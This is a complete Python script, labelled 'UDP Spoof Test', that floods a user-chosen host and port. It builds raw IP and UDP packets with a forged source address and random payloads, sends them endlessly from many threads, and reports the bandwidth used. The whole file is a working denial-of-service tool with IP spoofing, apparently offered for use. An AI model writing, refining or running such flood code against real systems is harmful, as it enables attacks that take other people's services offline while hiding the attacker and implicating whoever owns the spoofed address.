import socket
import random
import threading
import struct
import time

print("UDP Spoof Test")
ip = str(input("Host/Ip: "))
port = int(input("Port: "))
times = int(input("Packets per one connection: "))
threads = int(input("Threads: "))
spoofed_source_ip = str(input("Spoofed Source IP: "))

# Variables for bandwidth and time tracking
start_time = time.time()
total_bytes_sent = 0

# Variable for total bandwidth tracking
total_bandwidth = 0

# Variable to check if threads should keep running
running = True

def create_ip_header(source_ip, dest_ip):
    # wip
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0  # kernel will fill the correct total length
    ip_id = 54321  # Id of this packet
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_UDP
    ip_check = 0  # kernel will fill the correct checksum
    ip_saddr = socket.inet_aton(source_ip)  # Spoof the source ip if you want to
    ip_daddr = socket.inet_aton(dest_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    # IP header
    ip_header = struct.pack("!BBHHHBBH4s4s", ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

    return ip_header

def create_udp_header(source_ip, dest_ip, source_port, dest_port, data):
    # UDP header fields
    udp_length = 8 + len(data)
    udp_checksum = 0 # Checksum is optional for UDP

    # UDP header
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_checksum)

    return udp_header

def run():
    global total_bytes_sent
    global total_bandwidth

    data = random._urandom(1024)
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Create IP and UDP headers
            ip_header = create_ip_header(spoofed_source_ip, ip)
            udp_header = create_udp_header(spoofed_source_ip, ip, random.randint(1024, 65535), port, data)

            # Send smaller data packet
            packet = ip_header + udp_header + data
            s.sendto(packet, (ip, 0))
            bytes_sent = len(packet)
            total_bytes_sent += bytes_sent
            total_bandwidth += bytes_sent

            # Send bigger data packets based on times
            for x in range(times):
                s.sendto(packet, (ip, 0))
                bytes_sent = len(packet)
                total_bytes_sent += bytes_sent
                total_bandwidth += bytes_sent

        except Exception as e:
            print("[!] Error:", e)
        finally:
            s.close()

def monitor_bandwidth():
    global start_time
    global total_bytes_sent

    while running:
        elapsed_time = time.time() - start_time
        if elapsed_time < 0.001:  # Prevent division by extremely small numbers
            elapsed_time = 0.001

        bandwidth_rate = total_bytes_sent / (1024 ** 2)  # MB/s
        print(f"Time elapsed: {elapsed_time:.2f} seconds - UDP Sent - Bandwidth Rate: {bandwidth_rate:.2f} MB/s")
        total_bytes_sent = 0
        time.sleep(1)

# Start the bandwidth monitor thread
monitor_thread = threading.Thread(target=monitor_bandwidth)
monitor_thread.start()

# Start the flood threads
thread_list = []
for y in range(threads):
    th = threading.Thread(target=run)
    th.start()
    thread_list.append(th)

try:
    while threading.active_count() > 1:
        for t in thread_list:
            t.join(0.1)
except KeyboardInterrupt:

    print("\nStopping...")
    running = False
    elapsed_time = time.time() - start_time
    bandwidth_total = total_bandwidth / (1024 ** 2)  # Total MB sent
    print(f"Summary: Total time elapsed: {elapsed_time:.2f} seconds - Total Bandwidth Used: {bandwidth_total:.2f} MB")
